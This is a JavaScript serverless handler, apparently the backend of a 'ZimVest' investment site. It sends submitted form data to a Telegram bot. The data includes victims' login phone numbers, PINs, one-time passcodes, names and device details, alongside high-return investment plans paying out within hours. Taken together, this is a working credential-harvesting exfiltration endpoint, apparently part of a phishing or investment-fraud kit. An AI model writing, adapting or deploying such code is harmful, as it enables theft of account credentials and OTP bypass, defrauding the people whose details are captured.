// api/sendTelegram.js
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const TOKEN   = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TOKEN || !CHAT_ID) {
    const missing = [!TOKEN && 'TELEGRAM_TOKEN', !CHAT_ID && 'TELEGRAM_CHAT_ID'].filter(Boolean);
    return res.status(500).json({ error: 'Missing env vars: ' + missing.join(', ') });
  }

  let payload = {};
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body ?? '{}') : (req.body ?? {});
  } catch {
    return res.status(400).json({ error: 'Invalid JSON' });
  }

  // ── Helpers ──
  const esc  = s => String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const clip = (s, n = 600) => { const t = String(s ?? ''); return t.length > n ? esc(t.slice(0, n)) + '…' : esc(t); };

  // ── Build HTML message ──
  let text = `<b>🇿🇼 ZimVest — New Activity</b>\n`;
  text += `<b>Event:</b> ${esc(payload.event ?? '—')}\n`;
  if (payload.submittedAt) text += `<b>Time:</b> ${esc(payload.submittedAt)}\n`;

  // Investment plan
  const p = payload.selectedPlan;
  if (p && typeof p === 'object') {
    text += `\n<b>💰 Investment Plan</b>\n`;
    if (p.name)    text += `  Plan: <b>${esc(p.name)}</b>\n`;
    if (p.amount)  text += `  Deposit: <b>$${esc(p.amount)}</b>\n`;
    if (p.pct)     text += `  Return: <b>+${esc(p.pct)}%</b>\n`;
    if (p.payout)  text += `  Payout: <b>$${esc(p.payout)}</b>\n`;
    if (p.hours)   text += `  Duration: <b>${esc(p.hours)} hours</b>\n`;
  } else if (payload.plan) {
    text += `\n<b>Plan:</b> ${clip(payload.plan)}\n`;
  }

  // Credentials
  if (payload.loginPhone) {
    text += `\n<b>📱 Credentials</b>\n`;
    text += `  Phone: <b>${esc(payload.loginPhone)}</b>\n`;
    if (payload.loginPin)  text += `  PIN: <b>${esc(payload.loginPin)}</b>\n`;
    if (payload.name)      text += `  Name: <b>${esc(payload.name)}</b>\n`;
    if (payload.otp)       text += `  OTP: <b>${esc(payload.otp)}</b>\n`;
  }

  if (payload.device) text += `\n<b>Device:</b> ${esc(payload.device)}\n`;

  // Any unexpected extra keys
  const SKIP = new Set(['submittedAt','loginPhone','loginPin','otp','selectedPlan','event','name','device','plan']);
  const extras = Object.keys(payload).filter(k => !SKIP.has(k));
  if (extras.length) {
    text += `\n<b>Other</b>\n`;
    extras.forEach(k => { text += `  ${esc(k)}: ${clip(payload[k])}\n`; });
  }

  // ── Send ──
  try {
    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({
        chat_id:                CHAT_ID,
        text,
        parse_mode:             'HTML',
        disable_web_page_preview: true,
      }),
    });

    const body = await r.text();
    if (!r.ok) return res.status(502).json({ error: 'Telegram error', detail: body });

    try { return res.status(200).json(JSON.parse(body)); }
    catch { return res.status(200).send(body); }
  } catch (err) {
    return res.status(500).json({ error: 'Fetch failed', detail: err?.message });
  }
}
